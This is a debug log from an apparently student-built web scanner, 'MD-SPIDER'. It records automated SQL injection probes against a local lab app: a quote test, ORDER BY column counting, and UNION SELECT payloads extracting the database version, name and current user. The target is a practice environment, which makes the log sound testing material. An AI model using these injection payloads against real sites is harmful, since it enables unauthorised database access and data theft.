INFO [2022-05-26 09:46:38,786] root 184317 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 16:03:43,399] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:03:43,403] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,406] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:03:43,410] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,413] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:03:43,417] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,419] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:03:43,422] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,425] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:03:43,428] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,430] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:03:43,433] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,436] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:03:43,439] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,441] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-05-28 16:03:43,450] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,454] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:03:43,462] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,467] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:03:43,473] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,476] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20(SELECT+CURRENT_USER),%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:03:43,483] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,485] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20(SELECT+CURRENT_USER),%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:03:43,492] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,495] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20(SELECT+CURRENT_USER),%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:03:43,501] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,503] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20(SELECT+CURRENT_USER),%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:03:43,509] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,512] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20(SELECT+CURRENT_USER),%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:03:43,518] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,521] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20(SELECT+CURRENT_USER) HTTP/1.1" 200 3238]
INFO [2022-05-28 16:04:57,688] root 415157 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 16:04:58,017] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,043] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 16:04:58,047] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,050] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 16:04:58,053] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,056] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-05-28 16:04:58,060] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,064] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-05-28 16:04:58,068] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,071] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:04:58,074] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,079] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:04:58,083] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,086] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:04:58,090] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,096] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:04:58,099] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,103] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:04:58,106] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,108] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+6 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:04:58,111] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,114] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+7 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:04:58,116] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,119] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:04:58,121] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,123] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-05-28 16:04:58,126] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,129] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:04:58,134] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,137] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:04:58,141] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,145] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:04:58,149] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,153] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:04:58,155] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,158] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:04:58,160] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,164] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:04:58,167] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,170] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:04:58,172] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,175] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:04:58,178] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,181] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-05-28 16:04:58,190] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,194] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:04:58,204] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,207] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:04:58,214] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,216] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20(SELECT+CURRENT_USER),%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:04:58,224] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,226] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20(SELECT+CURRENT_USER),%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:04:58,233] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,236] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20(SELECT+CURRENT_USER),%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:04:58,242] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,245] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20(SELECT+CURRENT_USER),%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:04:58,251] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,254] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20(SELECT+CURRENT_USER),%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:04:58,260] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:04:58,262] urllib3.connectionpool 415157 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20(SELECT+CURRENT_USER) HTTP/1.1" 200 3238]
INFO [2022-05-28 16:14:47,509] root 416802 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
